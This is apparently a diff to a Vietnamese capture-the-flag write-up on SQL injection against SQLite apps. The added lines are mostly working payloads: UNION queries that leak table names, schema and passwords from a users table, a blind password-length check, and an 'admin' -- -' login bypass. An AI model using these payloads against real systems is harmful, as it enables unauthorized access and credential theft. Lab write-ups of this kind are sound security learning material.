@@ -55,3 +55,15 @@ admin' AND length((SELECT password from users where username='admin'))==37-- -
 
 ![Alt text](bin/image-17.png)
 - Để leak tên table `' union select 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -`
+- Leak column `' union select 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' -- -`
+- Leak password `' union select 1, group_concat(id,password) from users -- -`
+
+# 
+- Lỗi tương tự các bài ở trên
+![Alt text](bin/image-18.png)
+- username: `admin' -- -`
+
+# 
+- Kiểm tra cột `') union select 1,2,3,4 --`
+![Alt text](bin/image-19.png)
+- Kiểm tra table `') union select 1,2,3,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --`
